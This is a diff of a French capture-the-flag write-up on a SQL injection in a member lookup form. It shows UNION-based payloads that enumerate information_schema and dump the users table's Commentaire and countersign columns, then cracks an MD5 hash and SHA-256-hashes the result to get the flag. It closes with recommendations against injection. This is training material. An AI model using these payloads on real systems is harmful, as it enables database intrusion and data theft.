@@ -1,27 +1,74 @@
-Pour ce flag il faut se rendre dans la page "/?page=member".
+# Récupération de la Clé — Injection SQL sur la page Member
 
-Ici on trouve un form sur lequel on nous demande de rentrer un l'id d'un membre. Lorsque l'on rentre un id, par exemple "1", on nous donne des information structuré de cette manière :
+## 🔍 Méthode d'exploitation
 
-ID: 1 
+Pour ce flag, il faut se rendre sur la page **`/?page=member`**.
+
+On y trouve un formulaire demandant l'**ID d'un membre**. En entrant par exemple `1`, on obtient une réponse structurée de cette manière :
+
+```
+ID: 1
 First name: one
 Surname : me
+```
 
-On remarque bien que on est sur une structure typique du sql et que par conséquent on doit pouvoir récupérer des information via des injections SQL. On peut ensuite chercher à lister toutes les tables avec leurs colonnes et voir si des informations nous semble utiles. On utilise donc cette commande SQL :
+Cette structure typique indique une **requête SQL sous-jacente**, ce qui suggère une vulnérabilité aux **injections SQL**.
 
+---
+
+### Étape 1 — Lister les tables et colonnes
+
+On commence par récupérer toutes les tables et leurs colonnes via la requête suivante :
+
+```sql
 1 or 1=1 UNION SELECT table_name, column_name FROM information_schema.columns-- -
+```
 
-Cette requête retourne toutes les tables avec leurs colonnes. On repère la table users et on note ses colonnes : user_id, first_name, last_name, town, country, planet, Commentaire et countersign. C'est cette dernière colonne, combinée à Commentaire, qui va nous intéresser. On va donc récupérer les données de cette table via cette commande SQL :
+On repère la table **`users`** et ses colonnes : `user_id`, `first_name`, `last_name`, `town`, `country`, `planet`, **`Commentaire`** et **`countersign`**. Ce sont ces deux dernières colonnes qui vont nous intéresser.
 
+---
+
+### Étape 2 — Extraire les données de la table users
+
+On récupère le contenu des colonnes `Commentaire` et `countersign` :
+
+```sql
 1 or 1=1 UNION SELECT Commentaire, countersign FROM users-- -
+```
 
-Dans les données que l'on récupère on tombe sur ceci qui nous donne la marche à suivre :
+On obtient l'indice suivant dans les résultats :
 
-ID: 1 or 1=1 UNION SELECT Commentaire, countersign FROM users-- - 
+```
+ID: 1 or 1=1 UNION SELECT Commentaire, countersign FROM users-- -
 First name: Decrypt this password -> then lower all the char. Sh256 on it and it's good !
 Surname : 5ff9d0165b4f92b14994e5c685cdce28
+```
 
-Il nous suffit de casser les hash de la donnée présente dans la colonne "Surname" qui est encodé en md5 (comme pour le reste des codes du projet). On peut aussi le passer dans décrypteur comme CrackStation qui trouvera tout seul que c'est encodé en md5. Le résultat nous donne "FortyTwo".
+---
 
-On passe ensuite tous les caractères en minuscule comme dit dans l'indice. On applique ensuite le hash SHA-256 dessus pour trouver le flag via cette commande shell :
+### Étape 3 — Décrypter le hash MD5
 
+La valeur dans `Surname` est encodée en **MD5**. En la passant dans un décrypteur comme [CrackStation](https://crackstation.net/), on obtient : **`FortyTwo`**
+
+---
+
+### Étape 4 — Appliquer les transformations et générer le flag
+
+Conformément à l'indice :
+1. Passer tous les caractères en **minuscule** → `fortytwo`
+2. Appliquer un hash **SHA-256** :
+
+```bash
 echo -n "fortytwo" | sha256sum
+```
+
+---
+
+## 🛡️ Recommandations
+
+Pour se protéger contre les injections SQL :
+
+- Utiliser des **requêtes préparées** (prepared statements) avec des paramètres liés
+- **Ne jamais insérer directement** les entrées utilisateur dans une requête SQL
+- Mettre en place un système de **validation et d'échappement** des entrées
+- Limiter les **privilèges de l'utilisateur SQL** au strict nécessaire
